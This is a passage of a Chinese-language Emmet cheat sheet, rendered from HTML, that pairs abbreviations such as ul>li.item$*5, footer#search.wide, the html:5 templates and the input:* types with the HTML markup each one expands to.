$}*3</code></p>\n<div><pre><code><span><span><span>&lt;</span>h1</span> <span>title</span><span><span>=</span><span>\"</span>item1<span>\"</span></span><span>></span></span>Header 1<span><span><span>&lt;/</span>h1</span><span>></span></span>\n<span><span><span>&lt;</span>h2</span> <span>title</span><span><span>=</span><span>\"</span>item2<span>\"</span></span><span>></span></span>Header 2<span><span><span>&lt;/</span>h2</span><span>></span></span>\n<span><span><span>&lt;</span>h3</span> <span>title</span><span><span>=</span><span>\"</span>item3<span>\"</span></span><span>></span></span>Header 3<span><span><span>&lt;/</span>h3</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"例子三\" tabindex=\"-1\"> 例子三</h3>\n<p><code>ul&gt;li.item$*5</code></p>\n<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item001<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item002<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item003<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item004<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item005<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n<span><span><span>&lt;/</span>ul</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"例子四\" tabindex=\"-1\"> 例子四</h3>\n<p><code>ul&gt;li.item$@-*5</code></p>\n<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item5<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item4<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item3<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item2<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item1<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n<span><span><span>&lt;/</span>ul</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"例子五\" tabindex=\"-1\"> 例子五</h3>\n<p><code>ul&gt;li.item$@3*5</code></p>\n<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item3<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item4<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item5<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item6<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item7<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n<span><span><span>&lt;/</span>ul</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"id-和-class-属性\" tabindex=\"-1\"> ID 和 CLASS 属性</h2>\n<h3 id=\"例子一-3\" tabindex=\"-1\"> 例子一</h3>\n<div><pre><code><span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>\"</span>header<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子二-3\" tabindex=\"-1\"> 例子二</h3>\n<p><code>.title</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>\"</span>“title”<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子三-1\" tabindex=\"-1\"> 例子三</h3>\n<p><code>footer#search.wide</code></p>\n<div><pre><code><span><span><span>&lt;</span>footer</span> <span>id</span><span><span>=</span><span>\"</span>search<span>\"</span></span> <span>class</span><span><span>=</span><span>\"</span>wide<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>footer</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子四-1\" tabindex=\"-1\"> 例子四</h3>\n<p><code>p.class1.class2.class3</code></p>\n<div><pre><code><span><span><span>&lt;</span>p</span> <span>class</span><span><span>=</span><span>\"</span>class1 class2 class3<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"自定义属性\" tabindex=\"-1\"> 自定义属性</h2>\n<h3 id=\"例子一-4\" tabindex=\"-1\"> 例子一</h3>\n<p><code>p[title=&quot;Hello world&quot;]</code></p>\n<div><pre><code><span><span><span>&lt;</span>p</span> <span>title</span><span><span>=</span><span>\"</span>Hello world<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子二-4\" tabindex=\"-1\"> 例子二</h3>\n<p><code>td[rowspan=2 colspan=3 title]</code></p>\n<div><pre><code><span><span><span>&lt;</span>td</span> <span>rowspan</span><span><span>=</span><span>\"</span>2<span>\"</span></span> <span>colspan</span><span><span>=</span><span>\"</span>3<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>td</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子三-2\" tabindex=\"-1\"> 例子三</h3>\n<p><code>[a=&quot;value1&quot; b=&quot;value2&quot;]</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span> <span>a</span><span><span>=</span><span>\"</span>value1<span>\"</span></span> <span>b</span><span><span>=</span><span>\"</span>value2<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"文本内容\" tabindex=\"-1\"> 文本内容: {}</h2>\n<h3 id=\"例子一-5\" tabindex=\"-1\"> 例子一</h3>\n<p><code>a{Click me}</code></p>\n<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span><span>></span></span>Click me<span><span><span>&lt;/</span>a</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子二-5\" tabindex=\"-1\"> 例子二</h3>\n<p><code>p&gt;{Click }+a{here}+{ to continue}</code></p>\n<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span>Click <span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span><span>></span></span>here<span><span><span>&lt;/</span>a</span><span>></span></span> to continue<span><span><span>&lt;/</span>p</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"缺省标签名\" tabindex=\"-1\"> 缺省标签名</h2>\n<h3 id=\"例子一-6\" tabindex=\"-1\"> 例子一</h3>\n<p><code>.class1</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>\"</span>class1<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子二-6\" tabindex=\"-1\"> 例子二</h3>\n<p><code>em&gt;.class1</code></p>\n<div><pre><code><span><span><span>&lt;</span>em</span><span>></span></span><span><span><span>&lt;</span>span</span> <span>class</span><span><span>=</span><span>\"</span>class1<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span><span><span><span>&lt;/</span>em</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"例子三-3\" tabindex=\"-1\"> 例子三</h3>\n<p><code>ul&gt;.class1</code></p>\n<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>class1<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n<span><span><span>&lt;/</span>ul</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"例子四-2\" tabindex=\"-1\"> 例子四</h3>\n<p><code>table&gt;.row&gt;.col</code></p>\n<div><pre><code><span><span><span>&lt;</span>table</span><span>></span></span>\n  <span><span><span>&lt;</span>tr</span> <span>class</span><span><span>=</span><span>\"</span>row<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>td</span> <span>class</span><span><span>=</span><span>\"</span>col<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>td</span><span>></span></span>\n  <span><span><span>&lt;/</span>tr</span><span>></span></span>\n<span><span><span>&lt;/</span>table</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h1 id=\"html\" tabindex=\"-1\"> HTML</h1>\n<h2 id=\"html-基本模板\" tabindex=\"-1\"> HTML 基本模板</h2>\n<h3 id=\"doc\" tabindex=\"-1\"> doc</h3>\n<p><code>扩展写法</code> <code>html&gt;(header&gt;meta[charset=UTF-8]+title{${1:Document}})+body</code></p>\n<div><pre><code><span><span><span>&lt;</span>html</span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>\"</span>UTF-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"或者-html-5\" tabindex=\"-1\"> ! 或者 html:5</h3>\n<p><code>扩展写法</code> <code>!!!+doc[lang=${lang}]</code></p>\n<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>\n<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>\"</span>en<span>\"</span></span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>\"</span>UTF-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"doc4\" tabindex=\"-1\"> doc4</h3>\n<p><code>扩展写法</code> <code>html&gt;(head&gt;meta[http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=${charset}&quot;]+title{${1:Document}})+body</code></p>\n<div><pre><code><span><span><span>&lt;</span>html</span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>Content-Type<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>text/html;charset=UTF-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"html-4t\" tabindex=\"-1\"> html:4t</h3>\n<p><code>扩展写法</code> <code>!!!4t+doc4[lang=${lang}]</code></p>\n<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span> <span>PUBLIC</span> <span>\"-//W3C//DTD HTML 4.01 Transitional//EN\"</span> <span>\"https://www.w3.org/TR/html4/loose.dtd\"</span><span>></span></span>\n<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>\"</span>en<span>\"</span></span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>Content-Type<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>text/html;charset=UTF-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"html-4s\" tabindex=\"-1\"> html:4s</h3>\n<p><code>扩展写法</code> <code>!!!4s+doc4[lang=${lang}]</code></p>\n<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span> <span>PUBLIC</span> <span>\"-//W3C//DTD HTML 4.01//EN\"</span> <span>\"https://www.w3.org/TR/html4/strict.dtd\"</span><span>></span></span>\n<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>\"</span>en<span>\"</span></span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>Content-Type<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>text/html;charset=UTF-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"html-基本元素\" tabindex=\"-1\"> HTML 基本元素</h2>\n<h3 id=\"a\" tabindex=\"-1\"> A</h3>\n<h4 id=\"a-link\" tabindex=\"-1\"> a:link</h4>\n<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>\"</span>//<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"a-mail\" tabindex=\"-1\"> a:mail</h4>\n<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>\"</span>mailto:<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"area\" tabindex=\"-1\"> area</h4>\n<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>coords</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"area-d\" tabindex=\"-1\"> area:d</h4>\n<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>\"</span>default<span>\"</span></span> <span>coords</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"area-c\" tabindex=\"-1\"> area:c</h4>\n<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>\"</span>circle<span>\"</span></span> <span>coords</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"area-r\" tabindex=\"-1\"> area:r</h4>\n<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>\"</span>rect<span>\"</span></span> <span>coords</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"area-p\" tabindex=\"-1\"> area:p</h4>\n<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>\"</span>poly<span>\"</span></span> <span>coords</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"b\" tabindex=\"-1\"> B</h3>\n<h4 id=\"btn-r\" tabindex=\"-1\"> btn:r</h4>\n<div><pre><code><span><span><span>&lt;</span>button</span> <span>type</span><span><span>=</span><span>\"</span>reset<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>button</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"btn-s\" tabindex=\"-1\"> btn:s</h4>\n<div><pre><code><span><span><span>&lt;</span>button</span> <span>type</span><span><span>=</span><span>\"</span>submit<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>button</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"f\" tabindex=\"-1\"> F</h3>\n<h4 id=\"form-get\" tabindex=\"-1\"> form:get</h4>\n<div><pre><code><span><span><span>&lt;</span>form</span> <span>action</span><span><span>=</span><span>\"</span>get<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>form</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"form-post\" tabindex=\"-1\"> form:post</h4>\n<div><pre><code><span><span><span>&lt;</span>form</span> <span>action</span><span><span>=</span><span>\"</span>post<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>form</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"l\" tabindex=\"-1\"> L</h3>\n<h4 id=\"link\" tabindex=\"-1\"> link</h4>\n<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"link-css\" tabindex=\"-1\"> link:css</h4>\n<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span>style.css<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"link-print\" tabindex=\"-1\"> link:print</h4>\n<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span>print.css<span>\"</span></span> <span>media</span><span><span>=</span><span>\"</span>print<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"link-favicon\" tabindex=\"-1\"> link:favicon</h4>\n<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>\"</span>shortcut icon<span>\"</span></span> <span>type</span><span><span>=</span><span>\"</span>image/x-icon<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span>favicon.ico<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"link-touch\" tabindex=\"-1\"> link:touch</h4>\n<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>\"</span>apple-touch-icon<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span>favicon.png<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"i\" tabindex=\"-1\"> I</h3>\n<h4 id=\"img\" tabindex=\"-1\"> img</h4>\n<div><pre><code><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input\" tabindex=\"-1\"> input</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>text<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"inp\" tabindex=\"-1\"> inp</h4>\n<p>这种写法也适用: <code>input:text input:t</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>text<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-hideen\" tabindex=\"-1\"> input:hideen</h4>\n<p>这种写法也适用: <code>input:h</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>hidden<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-search\" tabindex=\"-1\"> input:search</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>search<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-email\" tabindex=\"-1\"> input:email</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>email<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-url\" tabindex=\"-1\"> input:url</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>url<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-password\" tabindex=\"-1\"> input:password</h4>\n<p>这种写法也适用: <code>input:p</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>password<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-datetime\" tabindex=\"-1\"> input:datetime</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>datetime<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-date\" tabindex=\"-1\"> input:date</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>date<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-datetime-local\" tabindex=\"-1\"> input:datetime-local</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>datetime-local<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-month\" tabindex=\"-1\"> input:month</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>month<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-week\" tabindex=\"-1\"> input:week</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>week<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-time\" tabindex=\"-1\"> input:time</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>time<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-number\" tabindex=\"-1\"> input:number</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>number<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-color\" tabindex=\"-1\"> input:color</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>color<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-checkbox\" tabindex=\"-1\"> input:checkbox</h4>\n<p>这种写法也适用: <code>input:c</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>checkbox<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-radio\" tabindex=\"-1\"> input:radio</h4>\n<p>这种写法也适用: <code>input:r</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>radio<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-range\" tabindex=\"-1\"> input:range</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>range<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-file\" tabindex=\"-1\"> input:file</h4>\n<p>这种写法也适用: <code>input:f</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>file<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>id</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div 